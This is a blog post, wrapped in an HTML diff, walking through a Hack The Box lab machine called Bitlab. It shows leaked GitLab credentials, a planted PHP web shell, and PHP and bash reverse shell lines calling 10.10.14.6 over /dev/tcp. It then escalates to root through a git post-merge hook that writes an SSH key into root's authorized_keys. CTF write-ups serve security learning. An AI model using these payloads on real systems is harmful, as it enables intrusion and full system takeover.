@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+  content="jivex5k">
+<meta name="description"
+  content="Welcome to another Forest Hex hacking adventure! 🌲🏹 Today I will be hacking an HTB box named bitlab.
+ Let&#39;s jump right in with a port scan, and as always, feel free to jump around.
+ Port Scan Poking around the Web Server The Initial Foothold Escalating to Root Creating the Git Hook   Port Scan Port Scan  Not a lot here, just a web server on port 80 and ssh on port 22." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="/posts/hack-the-box-bitlab/" />
+
+
+<title>
+  
+  Hack The Box - Bitlab :: Forest Hex  — An exploration of hacking and programming.
+  
+</title>
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-148164972-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-148164972-1');
+</script>
+
+
+<link href="/flag-icon.min.css" rel="stylesheet" type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+<meta itemprop="name" content="Hack The Box - Bitlab">
+<meta itemprop="description" content="Join me, won&#39;t you, on a whimsical journey exploiting the crap out of git.">
+<meta itemprop="datePublished" content="2020-01-11T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-01-11T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1138">
+<meta itemprop="image" content="/"/>
+
+
+
+<meta itemprop="keywords" content="ctf,HackTheBox,pentesting,git," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/"/>
+
+<meta name="twitter:title" content="Hack The Box - Bitlab"/>
+<meta name="twitter:description" content="Join me, won&#39;t you, on a whimsical journey exploiting the crap out of git."/>
+
+
+
+
+
+<meta property="article:published_time" content="2020-01-11 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home</span>
+            <span class="logo__cursor" style="background-color:#3f913d"></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">about</a></li><li><a href="/tags/">tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>6 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="/posts/hack-the-box-bitlab/">Hack The Box - Bitlab</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! 🌲🏹</h3>
+<p><em>Today I will be hacking an HTB box named bitlab.</em></p>
+
+    <figure class="left" >
+        <img src="1575834144.webp"   />
+
+        
+    </figure>
+
+
+<p>Let's jump right in with a port scan, and as always, feel free to jump around.</p>
+<ul>
+<li><a href="#port-scan">Port Scan</a></li>
+<li><a href="#poking-around-the-web-server">Poking around the Web Server</a></li>
+<li><a href="#the-initial-foothold">The Initial Foothold</a></li>
+<li><a href="#escalating-to-root">Escalating to Root</a></li>
+<li><a href="#creating-the-git-hook">Creating the Git Hook</a></li>
+</ul>
+<hr>
+<h1 id="port-scan">Port Scan</h1>
+
+    <figure class="left" >
+        <img src="1575843709.webp"   />
+
+        
+            <figcaption class="center" >Port Scan</figcaption>
+        
+    </figure>
+
+
+<p>Not a lot here, just a web server on port 80 and ssh on port 22.
+Time to poke around the server, I'll load it up in ZAP's proxy.</p>
+<hr>
+<h1 id="poking-around-the-web-server">Poking around the Web Server</h1>
+
+<figure class='left'>
+  <video style="height:100%;width:100%" src="zap.webm" loop="true" autoplay="true" muted="true"
+    playsinline="true">
+  </video>
+
+</figure>
+
+<p>You can see how zap easily let's you dive into the framework of a web site. It's running a local git repo which is a good place to look for credentials, or even exploits in source code.</p>
+<p>I tried the default credentials but they didn't work, so then I switched to finding an exploit for it. The first thing I needed was the version of gitlab. A stackoverflow answer said <code>/help</code> would display this information.</p>
+<p>I found something much different. It was a plain looking page with a link named <code>Bookmarks</code>, and after clicking on it I go this:
+
+    <figure class="left" >
+        <img src="1575845987.webp"   />
+
+        
+            <figcaption class="center" >Jackpot</figcaption>
+        
+    </figure>
+
+</p>
+<p>They all go to outside links except for the last one:</p>
+<p><code>javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()</code></p>
+<p>That looks like obfuscated javascript. I went to <code>jsnice.org</code> and got this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#e6db74">&#39;use strict&#39;</span>;
+<span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span> {
+  (<span style="color:#66d9ef">function</span>() {
+    <span style="color:#75715e">/** @type {!Array} */</span>
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;value&#34;</span>, <span style="color:#e6db74">&#34;user_login&#34;</span>, <span style="color:#e6db74">&#34;getElementById&#34;</span>, <span style="color:#e6db74">&#34;clave&#34;</span>, <span style="color:#e6db74">&#34;user_password&#34;</span>, <span style="color:#e6db74">&#34;11des0081x&#34;</span>];
+    document[<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">1</span>])[<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">3</span>];
+    document[<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">2</span>]](<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">4</span>])[<span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">0</span>]] <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">5</span>];
+  })();
+};
+</code></pre></div><p>This can be made more clear like so:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">document[<span style="color:#a6e22e">getElementById</span>](<span style="color:#a6e22e">user_login</span>)[<span style="color:#a6e22e">value</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">clave</span>;
+document[<span style="color:#a6e22e">getElementById</span>](<span style="color:#a6e22e">user_password</span>)[<span style="color:#a6e22e">value</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span><span style="color:#a6e22e">des0081x</span>;
+</code></pre></div><p>I tested the login and sure enough it worked.</p>
+
+    <figure class="left" >
+        <img src="1575846438.webp"   />
+
+        
+    </figure>
+
+
+<p>After poking around a bit I came across some credentials in a php snippet:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+$db_connection <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
+$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>($db_connection, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
+</code></pre></div><p>This will be useful once I find a way to achieve code execution. For now I can't access the sql server since the port isn't exposed, and they don't work as ssh creds.</p>
+<hr>
+<h1 id="the-initial-foothold">The Initial Foothold</h1>
+<p>While I was looking around I started to gain a better understanding of what was happening. There are two projects: Profile and Deployer. Profile is a simple php page, and deployer contains a script which will automatically pull any merge requests to the master branch in Profile. The php file is hosted on the web server at <code>/profile</code>, which I discovered by clicking on the settings link in the gitlab page.</p>
+<p>This means I should be able to create a reverse shell by editing the php file. The web interface allows me to do it so I don't even have to bother cloning the repo locally.</p>
+<p>In fact, this is a rare chance to try out a php web shell, I'm going to use the one here:
+<a href="https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php">https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php</a></p>
+<p>It worked like a charm:</p>
+
+<figure class='left'>
+  <video style="height:100%;width:100%" src="create_shell.webm" loop="true" autoplay="true" muted="true"
+    playsinline="true">
+  </video>
+
+</figure>
+
+<p>It's fun and all, but I truly prefer a terminal so I switched to this payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.10.14.6/44621 0&gt;&amp;1&#39;&#34;</span>);
+</code></pre></div>
+<figure class='left'>
+  <video style="height:100%;width:100%" src="pop_rev_shell.webm" loop="true" autoplay="true" muted="true"
+    playsinline="true">
+  </video>
+
+</figure>
+
+<p>After getting a netcat shell I upgraded it following this tutorial:
+<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>
+<p>I didn't use socat, I used python and the method under the socat description to upgrade it to full TTY.</p>
+<hr>
+<h1 id="escalating-to-root">Escalating to Root</h1>
+<p>The deployer script looked promising:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+
+$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
+$payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);
+
+$repo <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">project</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+$event <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">event_type</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+$state <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">state</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+$branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">object_attributes</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">target_branch</span> <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+
+<span style="color:#66d9ef">if</span> ($repo<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;Profile&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $branch<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;master&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $event<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merge_request&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $state<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;merged&#39;</span>) {
+    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;cd ../profile/; sudo git pull&#39;</span>),<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+}
+
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</code></pre></div><p>The <code>sudo git pull</code> command can be used to execute commands as root. I spent an extremely long time trying to think of a way to add a malicious git hook to the existing repo that would be pulled, but the two exploits I found were patched already.</p>
+<p>If you're curious:
+<a href="https://blog.developer.atlassian.com/securing-your-git-server/">https://blog.developer.atlassian.com/securing-your-git-server/</a>
+<a href="https://github.blog/2018-10-05-git-submodule-vulnerability/">https://github.blog/2018-10-05-git-submodule-vulnerability/</a></p>
+<p>I read a lot more articles about them, and eventually realized the system is running <code>2.19.1</code> which has both of these patched. I was stuck for a while, even knowing I had passwordless sudo to use <code>git pull</code> I just couldn't make the connection. I reached out on discord for a nudge, all that was needed was a reminder of what I knew:</p>
+<blockquote>
+<p>you only need to know that you can run sudo git pull as www-data</p>
+</blockquote>
+<p>It hit me like a ton of bricks.. I could simply copy the existing git repo to another folder and add a githook. The passwordless sudo access doesn't specify a folder so I can make a new one in /tmp and I will have the ability to create a new git hook. 
+<code>git</code> itself is restricted, so I can't just do a git init either.</p>
+<h1 id="creating-the-git-hook">Creating the Git Hook</h1>
+<hr>
+<p>I tested if I could simply copy the <code>.git</code> folder and add a hook on my local machine, and had an issue with my powershell script. Apparently even in windows the githook still needs <code>#!/bin/bash</code>. I tried that but ended up with an error:
+<code>New-Item : A positional parameter cannot be found that accepts argument 'is</code></p>
+<p>Hm, something in my test string maybe. I changed the git hook to:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
+</span><span style="color:#75715e"></span>exec powershell New-Item -Path <span style="color:#e6db74">&#39;C:\Users\Brian&#39;</span> -Name <span style="color:#e6db74">&#39;testfile1.txt&#39;</span> -ItemType <span style="color:#e6db74">&#39;file&#39;</span> -Value <span style="color:#e6db74">&#39;Test.&#39;</span>
+</code></pre></div>
+    <figure class="left" >
+        <img src="1576042443.webp"   />
+
+        
+            <figcaption class="center" >Git hook working.</figcaption>
+        
+    </figure>
+
+
+<p>That means I should be able to run a command as root with this process:</p>
+<ol>
+<li>Copy the .git folder of the profile into a new folder where <code>www-data</code> has write access.</li>
+<li>Create a <code>post-merge</code> git hook that either spawns a local, or reverse shell.</li>
+<li>Make an update to the profile repo with the web interface.</li>
+<li>Run <code>sudo git pull</code> in the folder of our copy.</li>
+</ol>
+<p>The post-merge hook should then be invoked under sudo access, which will give us a root shell.</p>
+<p>I copied the <code>.git</code> folder to <code>/tmp/fine/.git</code> and created a file under <code>.git/hooks</code> named <code>post-merge</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
+</span><span style="color:#75715e"></span>
+exec /bin/bash
+</code></pre></div><p>Now all there is to to is to push an update and sudo git pull&hellip; Or I thought. It didn't work, so I'm changing the post-merge to:
+<code>bash -i &gt; /dev/tcp/10.10.14.6/44621 0&gt;&amp;1</code></p>
+<p>Unfortunately that didn't work either. I decided to simply have it write an SSH public key to the authorized_keys folder of root. First I checked <code>/etc/passwd</code> to make sure root has a login, it does.</p>
+<p>After that I checked <code>/etc/ssh/sshd_config</code> to make sure I could log in with a public key. It does, and it looks in the normal place.</p>
+<p>I generate a new key with <code>ssh-keygen -t rsa</code>, <code>chmod 600 id_rsa</code> to give it the right permissions for the SSH client, and copy the public key to the post-merge hook:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@bitlab:/tmp/fine$ cat .git/hooks/post-merge
+<span style="color:#75715e">#!/bin/sh</span>
+
+echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBw9GB12s3G2XCXPLGbbf3wM9CAuwPcTWzZL/zzGaFkKY3uIe1sdc4nQ1Rsq9HyRIb6uhV3CDVy2Qqv55qt/VE8Uox/x5lm90Ct4YzeBHGDkethBZSOkIkEGNAPNCiPIDTI1ZZOERS26iJydYZMRb4Y5/qjt+Sc3tbMy4cAVQoHeUVnu8pwWYszZ4Sn3jKrrHaqgabzfM5hjzcb/6HvF0R+w/d/5VgN3TEz6zsIf7EPebv6fSiyinrM9SB/U5ZO3w5ft5uOzonrVgPIDWs+hgQzlqACmIVr0fx2rk2pfNTMqgp0r/XGMkyAjD6Ykwg1IXqgYENLSpgS9Q4JA/V9NK4t82uwf81+3ejp10CBRQuhUsVhzOoqeGHGk5fX1HaIQjwiTtPbYO7oL1TE+LenNWgSOH+p2FSdTleXaQmREZ4CUJdTAzTA8fvjb1A+BqlODl2wAcH2AMqUDo3Yt9/RCB8M38ocuwjsRvhYYYbNqbWwoZS5sQ+fGcpxWrYzJ9KOos= root@wks104&#34;</span> &gt;&gt; /root/.ssh/authorized_keys
+cat /root/.ssh/authorized_keys
+</code></pre></div><p>I had the post-merge output the keys just to see if mine was added, sure enough it was, which means:
+<code>ssh root@10.10.10.114 -i id_rsa</code> should get me in.</p>
+
+    <figure class="left" >
+        <img src="1576045790.webp"   />
+
+        
+            <figcaption class="center" >Got Root</figcaption>
+        
+    </figure>
+
+
+<p>Awesome! Abusing git hooks for fun and profit! Until next time this is jivex5k signing off!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/ctf">ctf</a></span><span class="tag"><a href="/tags/hackthebox">HackTheBox</a></span><span class="tag"><a href="/tags/pentesting">pentesting</a></span><span class="tag"><a href="/tags/git">git</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1138 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-01-11 00:00 &#43;0000</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="/posts/hack-the-box-craft/">
+                                <span class="button__text">Hack The Box - Craft</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+
+        <div id="comments" class="thin"><script src="https://utteranc.es/client.js"
+        repo="wgehalo/wgehalo.github.io"
+        issue-term="pathname"
+        label="comment"
+        theme="photon-dark"
+        crossorigin="anonymous"
+        async>
+</script></div>
+
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="/">jivex5k</a></span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+
+
+
+    </body>
+</html>
